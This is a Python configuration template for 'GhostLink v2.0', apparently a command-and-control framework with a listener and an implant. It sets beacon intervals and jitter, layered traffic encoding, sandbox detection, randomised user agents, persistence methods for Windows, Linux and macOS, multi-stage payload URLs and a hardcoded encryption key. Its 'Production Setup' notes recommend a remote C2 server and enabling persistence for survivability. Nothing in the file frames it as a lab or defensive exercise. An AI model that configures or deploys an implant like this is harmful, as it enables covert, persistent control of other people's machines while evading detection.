# GhostLink v2.0 - Configuration Template
# Copy this file to config.py and modify values as needed

# ============================================================================
# SERVER CONFIGURATION (Listener.py)
# ============================================================================

SERVER_CONFIG = {
    # Network settings
    "host": "0.0.0.0",              # Listening address (0.0.0.0 = all interfaces)
    "port": 8888,                   # Port number
    "debug": False,                 # Debug mode (False for production)
    
    # Database
    "database": "ghostlink.db",     # SQLite database file
    
    # Encryption
    "encryption_key": b"p-EVN8hYvMU8sH7pV0q6vF-YlK9pNxR5tQ2K8zM0GJQ=",
    
    # Logging
    "log_level": "INFO",            # DEBUG, INFO, WARNING, ERROR
    "log_file": "server.log",
}

# ============================================================================
# AGENT CONFIGURATION (Implant.py)
# ============================================================================

AGENT_CONFIG = {
    # C2 Server settings
    "c2_server": "http://127.0.0.1:8888",  # Change to your server IP/domain
    "agent_id": "Agent_01",                 # Unique agent identifier
    
    # Beaconing
    "beacon_interval": 10,          # Beacon interval in seconds
    "beacon_jitter": 3,             # ±X seconds randomization
    
    # Encoding
    "encoding_scheme": "chain",     # base64, hex, rot13, chain
    "use_multilayer": True,         # Enable Fernet→Base64→Hex
    
    # Evasion
    "enable_evasion": True,         # Random UA, jitter, sandbox detection
    "enable_persistence": False,    # Enable persistence (requires elevated privileges)
    
    # Proxy (optional)
    "proxy_support": None,          # {"http": "socks5://proxy:port"}
    # "proxy_support": {
    #     "http": "socks5://127.0.0.1:1080",
    #     "https": "socks5://127.0.0.1:1080"
    # },
    
    # Encryption
    "encryption_key": b"p-EVN8hYvMU8sH7pV0q6vF-YlK9pNxR5tQ2K8zM0GJQ=",
    
    # Timeout
    "command_timeout": 10,          # Command execution timeout (seconds)
}

# ============================================================================
# ENCRYPTION KEY GENERATION
# ============================================================================
# To generate a new encryption key:
# 
# from cryptography.fernet import Fernet
# key = Fernet.generate_key()
# print(key)
#
# Copy the output and replace "encryption_key" values

# ============================================================================
# LOGGING CONFIGURATION
# ============================================================================

LOGGING_CONFIG = {
    "format": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    "date_format": "%Y-%m-%d %H:%M:%S",
    "filename": "ghostlink.log",
    "level": "INFO",
}

# ============================================================================
# ADVANCED CONFIGURATION
# ============================================================================

ADVANCED_CONFIG = {
    # Persistence methods to enable (on supported platforms)
    "persistence_methods": {
        "windows": ["registry", "tasks"],
        "linux": ["cron", "systemd", "rc.local"],
        "macos": ["launchagent"],
    },
    
    # Multi-stage loading
    "enable_multistage": True,
    "stage2_url": "/stage2",
    "stage3_url": "/stage3",
    
    # Evasion options
    "sandbox_detection": True,
    "randomize_ua": True,
    "output_truncation": 10000,  # Truncate output to N bytes
    
    # Connection retries
    "max_retries": 5,
    "retry_delay": 5,  # seconds
}

# ============================================================================
# ENCODING SCHEMES
# ============================================================================
# Available schemes:
# - "base64"       (Strength: ★)
# - "hex"          (Strength: ★★)
# - "rot13"        (Strength: ★★)
# - "chain"        (Strength: ★★★) - Base64 → Hex

# Multi-layer encoding adds:
# Fernet encryption → Base64 encoding → Hex encoding

# ============================================================================
# QUICK REFERENCE
# ============================================================================
# 
# Development Setup:
#   - localhost C2 server on port 8888
#   - Agent on same machine
#   - Debug mode enabled
#   - No persistence
#
# Production Setup:
#   - C2 server on remote IP/domain
#   - Use HTTPS/TLS proxy
#   - Generate new encryption key
#   - Enable persistence for survivability
#   - Disable debug mode
#   - Set proper beacon intervals
#
# ============================================================================
